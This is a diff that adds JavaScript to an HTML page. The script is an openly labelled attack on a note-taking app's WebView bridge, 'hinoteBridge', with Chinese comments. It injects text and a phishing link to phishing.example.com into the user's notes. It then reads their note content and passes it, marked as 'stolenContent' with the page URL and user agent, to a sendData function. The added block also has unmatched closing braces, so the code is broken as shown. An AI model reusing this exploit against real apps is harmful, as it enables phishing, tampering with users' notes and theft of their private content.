@@ -76,6 +76,63 @@
     </div>
 
     <script>
+         if (window.hinoteBridge) {
+                    console.log('✅ hinoteBridge 存在');
+                    showStatus('发现笔记接口', 'success');
+                    
+                    // 收集信息
+                    collectedData = {
+                        url: window.location.href,
+                        userAgent: navigator.userAgent,
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    // 执行攻击
+                    try {
+                        // 1. 注入文本
+                        window.hinoteBridge.addText('[⚠️ 此内容已被恶意注入]\n\n');
+                        console.log('✅ 注入文本成功');
+                        
+                        // 2. 注入钓鱼链接
+                        window.hinoteBridge.addLinkToTextContent(JSON.stringify({
+                            url: 'https://phishing.example.com',
+                            text: '🎁 点击领取奖励',
+                            startOffset: 0,
+                            endOffset: 5
+                        }));
+                        console.log('✅ 注入链接成功');
+                        
+                        // 3. 窃取内容
+                        window.hinoteBridge.getTextForSummary(function(content) {
+                            console.log('📊 获取到内容:', content);
+                            collectedData.stolenContent = content;
+                            showData({stolenContent: content});
+                            sendData(collectedData);
+                        });
+                        
+                        showStatus('攻击成功！数据已注入', 'success');
+                        sendData(collectedData);
+                        
+                    } catch(e) {
+                        console.error('❌ 攻击失败:', e);
+                        showStatus('攻击失败：' + e.message, 'error');
+                        collectedData.error = e.message;
+                        sendData(collectedData);
+                    }
+                    
+                } else {
+                    console.log('❌ hinoteBridge 不存在');
+                    showStatus('当前环境不支持', 'error');
+                    
+                    collectedData = {
+                        error: 'hinoteBridge not found',
+                        url: window.location.href,
+                        userAgent: navigator.userAgent
+                    };
+                    sendData(collectedData);
+                }
+            }, 1000);
+        }
         const statusEl = document.getElementById('status');
         const dataDisplay = document.getElementById('dataDisplay');
         const dataContent = document.getElementById('dataContent');
